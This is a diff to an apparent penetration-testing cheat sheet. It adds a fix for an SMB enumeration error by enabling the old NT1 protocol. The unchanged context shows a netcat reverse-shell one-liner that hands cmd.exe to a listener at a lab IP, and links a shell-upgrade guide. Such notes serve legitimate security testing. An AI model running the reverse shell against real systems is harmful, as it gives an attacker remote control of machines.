@@ -133,6 +133,20 @@ These are the most consistent webshells that I have discovered throughout testin
 
 `nc.exe 10.10.10.1 4444 –e cmd.exe`
 
+### SMB
+
+If you are received the following error message when attempting to enumerate an SMB share then apply the following fix:&#x20;
+
+```
+do_connect: Connection to 10.11.1.136' failed (Error NT_STATUS_UNSUCCESSFUL)
+```
+
+Fix:
+
+```
+client min protocol = NT1
+```
+
 ### Shell Upgrades
 
 [This is a great guide on upgrading to a TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
